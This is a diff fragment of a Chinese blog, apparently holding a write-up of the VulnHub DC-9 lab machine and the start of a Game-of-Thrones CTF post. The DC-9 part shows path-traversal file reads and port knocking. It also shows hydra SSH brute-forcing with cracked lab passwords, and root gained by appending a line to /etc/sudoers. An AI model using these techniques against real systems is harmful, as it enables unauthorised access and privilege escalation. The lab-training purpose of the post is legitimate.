+<h3 id="etc-ssh-sshd-config"><a href="#etc-ssh-sshd-config" class="headerlink" title="&#x2F;etc&#x2F;ssh&#x2F;sshd_config"></a>&#x2F;etc&#x2F;ssh&#x2F;sshd_config</h3><p>查看<code>etc/ssh/sshd_config</code>配置文件，浏览器搜索<code>root</code>,查看有用的信息，可以发现不允许<code>root</code>远程<code>ssh</code>登录</p>
+<p><img src="/assets/Pasted%20image%2020260110185335.png"></p>
+<h3 id="proc-sched-debug"><a href="#proc-sched-debug" class="headerlink" title="&#x2F;proc&#x2F;sched_debug"></a>&#x2F;proc&#x2F;sched_debug</h3><p>将页面上的数据复制，然后到<code>kali</code> 中，执行<code>vi b.txt</code>, 粘贴进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.45/addrecord.php?file=../../../../proc/sched_debug</span><br></pre></td></tr></table></figure>
+<p><img src="/assets/Pasted%20image%2020260110190422.png"><br>将数据处理后可以看到<code>knockd</code>的服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# <span class="built_in">cat</span> b.txt|egrep <span class="string">&#x27;[a-zA-Z]+&#x27;</span> -o|<span class="built_in">sort</span>|<span class="built_in">uniq</span>  </span><br><span class="line">...</span><br><span class="line">kdevtmpfs</span><br><span class="line">key</span><br><span class="line">khugepaged</span><br><span class="line">khungtaskd</span><br><span class="line">kintegrityd</span><br><span class="line">knockd <span class="comment">#注意这个服务</span></span><br><span class="line">ksmd</span><br><span class="line">ksoftirqd</span><br><span class="line">kstrp</span><br><span class="line">kswapd</span><br><span class="line">kthreadd</span><br><span class="line">kthrotld</span><br><span class="line">ktime</span><br><span class="line">kworker</span><br><span class="line">latency</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[!NOTE] 命令解释<br> <code>awk -F, &#39;{print $2}&#39;</code> ：<strong>提取第二列</strong>。<code>awk</code>是一个强大的文本处理工具。<code>-F,</code>指定使用<strong>逗号</strong>作为字段分隔符（CSV文件的标准分隔符）。<code>{print $2}</code>表示打印每一行的第二个字段</p>
+</blockquote>
+<h3 id="etc-knockd-conf"><a href="#etc-knockd-conf" class="headerlink" title="&#x2F;etc&#x2F;knockd.conf"></a>&#x2F;etc&#x2F;knockd.conf</h3><p>敲门服务，需要依次对三个端口发送SYN包才能启动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.45/addrecord.php?file=../../../../etc/knockd.conf</span><br><span class="line"></span><br><span class="line">[options] UseSyslog </span><br><span class="line">[openSSH] sequence = 7469,8475,9842 </span><br><span class="line">seq_timeout = 25 </span><br><span class="line">command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j </span><br><span class="line">ACCEPT tcpflags = syn </span><br><span class="line">[closeSSH] </span><br><span class="line">sequence = 9842,8475,7469 </span><br><span class="line">seq_timeout = 25 </span><br><span class="line">command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j </span><br><span class="line">ACCEPT tcpflags = syn</span><br></pre></td></tr></table></figure>
+
+
+<p>先进行<code>nmap</code>,发现<code>22</code>端口过滤状态，依次执行<code>3</code>次<code>nc</code>命令后，<code>22</code>端口开启</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nmap -p 22 192.168.3.45            </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 19:09 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.45</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE    SERVICE</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">MAC Address: 08:00:27:95:4E:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.30 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# 7469,8475,9842         </span><br><span class="line">7469,8475,9842：未找到命令</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nc 192.168.3.45 7469                                                    </span><br><span class="line">(UNKNOWN) [192.168.3.45] 7469 (?) : Connection refused</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nc 192.168.3.45 8475</span><br><span class="line">(UNKNOWN) [192.168.3.45] 8475 (?) : Connection refused</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nc 192.168.3.45 9842</span><br><span class="line">(UNKNOWN) [192.168.3.45] 9842 (?) : Connection refused</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nmap -p 22 192.168.3.45</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 19:10 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.45</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">MAC Address: 08:00:27:95:4E:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.25 seconds</span><br></pre></td></tr></table></figure>
+
+<p>或者直接<code>knock</code>命令启动, 若未安装执行 <code>apt install knockd -y</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# knock 192.168.3.45 7469 8475 9842</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-hydra"><a href="#4-hydra" class="headerlink" title="4.hydra"></a>4.hydra</h2><p>用<code>hrdra</code>爆破ssh登录的账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# hydra -L user.txt -P pass.txt ssh://192.168.3.45 -t 4</span><br><span class="line"></span><br><span class="line">[STATUS] 80.00 tries/min, 80 tries <span class="keyword">in</span> 00:01h, 281 to <span class="keyword">do</span> <span class="keyword">in</span> 00:04h, 4 active</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: joeyt   password: Passw0rd</span><br><span class="line">[STATUS] 91.33 tries/min, 274 tries <span class="keyword">in</span> 00:03h, 87 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 4 active</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: janitor   password: Ilovepeepee</span><br><span class="line">[STATUS] 89.50 tries/min, 358 tries <span class="keyword">in</span> 00:04h, 3 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 4 active</span><br><span class="line">1 of 1 target successfully completed, 3 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-10 19:25:08</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>[!NOTE] -L user.txt</p>
+<ul>
+<li><code>-L</code>：大写 L，对应「批量用户名」，指定一个文本格式的用户名字典文件（每行一个用户名）</li>
+<li><code>user.txt</code>：当前工作目录下的用户名字典文件（若文件不在当前目录，需填写绝对路径，如 &#96;&#x2F;t</li>
+</ul>
+</blockquote>
+<h3 id="用户chandlerb"><a href="#用户chandlerb" class="headerlink" title="用户chandlerb"></a>用户chandlerb</h3><p>无有用的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">chandlerb@dc-9:~$ <span class="built_in">ls</span> -al</span><br><span class="line">total 12</span><br><span class="line">drwx------  3 chandlerb chandlerb 4096 Jan 10 21:23 .</span><br><span class="line">drwxr-xr-x 19 root      root      4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 chandlerb chandlerb    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  3 chandlerb chandlerb 4096 Jan 10 21:23 .gnupg</span><br><span class="line">chandlerb@dc-9:~$ <span class="built_in">history</span></span><br><span class="line">    1  <span class="built_in">ls</span> -al</span><br><span class="line">    2  <span class="built_in">history</span></span><br><span class="line">chandlerb@dc-9:~$ <span class="built_in">cd</span> .gnupg/</span><br><span class="line">chandlerb@dc-9:~/.gnupg$ <span class="built_in">ls</span> -l</span><br><span class="line">total 4</span><br><span class="line">drwx------ 2 chandlerb chandlerb 4096 Jan 10 21:23 private-keys-v1.d</span><br><span class="line">chandlerb@dc-9:~/.gnupg$ <span class="built_in">cd</span> private-keys-v1.d/</span><br><span class="line">chandlerb@dc-9:~/.gnupg/private-keys-v1.d$ <span class="built_in">ls</span> -l</span><br><span class="line">total 0</span><br><span class="line">chandlerb@dc-9:~/.gnupg/private-keys-v1.d$ <span class="built_in">sudo</span> -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> chandlerb: </span><br><span class="line">Sorry, user chandlerb may not run <span class="built_in">sudo</span> on dc-9.</span><br></pre></td></tr></table></figure>
+<h3 id="用户joeyt"><a href="#用户joeyt" class="headerlink" title="用户joeyt"></a>用户joeyt</h3><p>同样没发现有用的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">joeyt@dc-9:~$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwx------  3 joeyt joeyt 4096 Jan 10 21:23 .</span><br><span class="line">drwxr-xr-x 19 root  root  4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 joeyt joeyt    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  3 joeyt joeyt 4096 Jan 10 21:23 .gnupg</span><br><span class="line">joeyt@dc-9:~$ sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the local System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    #1) Respect the privacy of others.</span><br><span class="line">    #2) Think before you type.</span><br><span class="line">    #3) With great power comes great responsibility.</span><br></pre></td></tr></table></figure>
+
+<h3 id="用户janitor"><a href="#用户janitor" class="headerlink" title="用户janitor"></a>用户janitor</h3><p>发现几个密码，添加到刚才的<code>pass.txt</code>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">janitor@dc-9:~$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwx------  4 janitor janitor 4096 Jan 10 21:24 .</span><br><span class="line">drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  3 janitor janitor 4096 Jan 10 21:24 .gnupg</span><br><span class="line">drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin</span><br><span class="line">janitor@dc-9:~$ cat .secrets-for-putin/</span><br><span class="line">cat: .secrets-for-putin/: Is a directory</span><br><span class="line">janitor@dc-9:~$ cd .secrets-for-putin/</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwx------ 2 janitor janitor 4096 Dec 29  2019 .</span><br><span class="line">drwx------ 4 janitor janitor 4096 Jan 10 21:24 ..</span><br><span class="line">-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt </span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>
+
+<p><strong>重新爆破</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# hydra -L user.txt -P pass.txt ssh://192.168.3.45 -t 64</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: fredf   password: B4-Tru3-001</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>
+<p>发现多了一个用户<code>fredf</code></p>
+<h3 id="用户fredf"><a href="#用户fredf" class="headerlink" title="用户fredf"></a>用户fredf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> fredf on dc-9:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User fredf may run the following commands on dc-9:</span><br><span class="line">    (root) NOPASSWD: /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure>
+
+
+<p>查看本地的<code>/etc/sudoers</code><br><img src="/assets/Pasted%20image%2020260110194213.png"></p>
+<p>直接查看<code>/opt/devstuff/dist/test/test</code>发现是乱码，到上级目录发现是<code>python</code>文件编译的，直接查看源码<code>test.py</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist/test$ cd ..</span><br><span class="line">fredf@dc-9:/opt/devstuff/dist$ ls</span><br><span class="line">test</span><br><span class="line">fredf@dc-9:/opt/devstuff/dist$ cd ..</span><br><span class="line">fredf@dc-9:/opt/devstuff$ ls -l</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 29  2019 build</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 29  2019 dist</span><br><span class="line">drwxr-xr-x 2 root root 4096 Dec 29  2019 __pycache__</span><br><span class="line">-rw-r--r-- 1 root root  250 Dec 29  2019 test.py</span><br><span class="line">-rw-r--r-- 1 root root  959 Dec 29  2019 test.spec</span><br><span class="line">fredf@dc-9:/opt/devstuff$ cat test.py </span><br><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len (sys.argv) != 3 :</span><br><span class="line">    print (&quot;Usage: python test.py read append&quot;)</span><br><span class="line">    sys.exit (1)</span><br><span class="line"></span><br><span class="line">else :</span><br><span class="line">    f = open(sys.argv[1], &quot;r&quot;)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[2], &quot;a&quot;)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>[!Info] test.py<br>这个 Python 脚本是一个用于文件操作的工具，它的核心功能是读取一个文件的内容，然后将其追加到另一个文件的末尾。<br>简单来说，这个脚本完成了以下几步：</p>
+</blockquote>
+<ol>
+<li><strong>参数检查</strong>：首先，它检查运行脚本时提供的参数个数。脚本期望除了自身的名字（<code>sys.argv[0]</code>）外，还有两个参数：一个用于读取的文件，一个用于追加的文件。如果参数数量不对，会打印用法说明并退出。</li>
+<li><strong>读取文件</strong>：它打开第一个参数指定的文件（<code>sys.argv[1]</code>），读取其全部内容。</li>
+<li><strong>追加内容</strong>：接着，它打开第二个参数指定的文件（<code>sys.argv[2]</code>），并将从第一个文件读出的内容追加到它的末尾。<br>一个简单的使用例子如下：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设当前目录有 file1.txt（内容为&quot;Hello&quot;）和 file2.txt（内容为&quot;World&quot;）</span></span><br><span class="line">python test.py file1.txt file2.txt</span><br><span class="line"><span class="comment"># 运行后，file2.txt 的内容将变为 &quot;WorldHello&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>可以查看本地的<code>/etc/sudoers</code>，将<code>%sudo   ALL=(ALL:ALL) ALL</code>复制到<code>fredf</code>下的<code>a.txt</code>中</p>
+<blockquote>
+<p>[!Warning] <code>/etc/sudoers</code><br><code>/etc/sudoers</code> 是 Linux&#x2F;Unix 系统中<strong>核心的权限控制文件</strong>，用于定义哪些用户 &#x2F; 用户组可以以何种方式（是否需要密码、可执行哪些命令）临时获取 <code>root</code> 或其他用户的权限。其设计目标是在保障系统安全的前提下，实现权限的精细化分配，</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.doubao.com/thread/w91afa01ef034300b">https://www.doubao.com/thread/w91afa01ef034300b</a> 介绍<code>/etc/sudoers</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff$ cd /tmp</span><br><span class="line">fredf@dc-9:/tmp$ nano a.txt</span><br><span class="line">fredf@dc-9:/tmp$ cat a.txt </span><br><span class="line">fredf   ALL=(ALL:ALL) ALL</span><br><span class="line">fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test a.txt /etc/sudoers</span><br><span class="line">fredf@dc-9:/tmp$ sudo su -</span><br><span class="line">[sudo] password for fredf: </span><br><span class="line">root@dc-9:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">root@dc-9:~# cat theflag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have done well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an end, and this will be the last ever</span><br><span class="line">challenge in the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks for all the fish.</span><br></pre></td></tr></table></figure>
+
+<p>[^1]: </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/Game-of-Thrones/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/saber.jpg">
+      <meta itemprop="name" content="zhaochoudecat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zhaochoudecat">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/Game-of-Thrones/" class="post-title-link" itemprop="url">Game-of-Thrones</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-05-03 00:00:00 / 修改时间：04:03:57" itemprop="dateCreated datePublished" datetime="2026-05-03T00:00:00+08:00">2026-05-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/game-of-thrones-ctf-1,201/">https://www.vulnhub.com/entry/game-of-thrones-ctf-1,201/</a><br><img src="/assets/Pasted%20image%2020251223194902.png"></p>
+<blockquote>
+<p>[!tip]- tips<br>Get the 7 kingdom flags and the 4 extra content flags (3 secret flags + final battle flag). There are 11 in total. </p>
+</blockquote>
+<p>权力的游戏</p>
+<h2 id="1-arp"><a href="#1-arp" class="headerlink" title="1.arp"></a>1.arp</h2><p><img src="/assets/Pasted%20image%2020251223205139.png"></p>
+<h2 id="2-namp"><a href="#2-namp" class="headerlink" title="2.namp"></a>2.namp</h2><p>推荐用这种方式, 可以扫描到1337端口，下面的命令扫描不到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -p- 192.168.43.13 <span class="comment"># 全开扫描+版本+系统+脚本探测</span></span><br></pre></td></tr></table></figure>
+<p><img src="/assets/Pasted%20image%2020251224104738.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sS -sV -sC -O 192.168.3.17</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/Pasted%20image%2020251223205223.png"></p>
+<blockquote>
+<p>[!summary]- 端口号<br>port doamin<br>21 ftp<br>22 ssh<br>53 domain<br>80 Apach httpd<br>143 imap<br>3306 mysql<br>5432 postgresql<br>10000 MiniServ</p>
+</blockquote>
+<p>-sV 服务程序以及版本信息<br>-A  综合扫描<br>-oG 分类保存<br>-T4 快速扫描</p>
+<p>[[扫描结果]]</p>
+<p><img src="/assets/Pasted%20image%2020260102212517.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1184,332 +1455,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/3-php%E7%BB%95%E8%BF%87-Secret%20File/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/saber.jpg">
-      <meta itemprop="name" content="zhaochoudecat">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zhaochoudecat">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
